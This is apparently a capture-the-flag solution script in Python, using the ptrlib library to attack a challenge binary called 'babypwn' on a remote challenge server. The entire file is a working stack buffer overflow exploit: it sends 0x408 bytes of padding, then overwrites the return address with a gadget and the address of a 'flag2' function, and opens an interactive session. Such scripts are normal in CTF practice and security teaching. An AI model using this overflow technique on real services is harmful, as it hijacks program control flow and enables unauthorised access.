from ptrlib import *

elf = ELF("./babypwn")
#sock = Process("./babypwn")
sock = Socket("prob.vulnerable.kr", 20035)

payload = b"A" * 0x408
payload += p64(0x40065a)
payload += p64(elf.symbol("flag2"))
sock.sendline(payload)

sock.interactive()
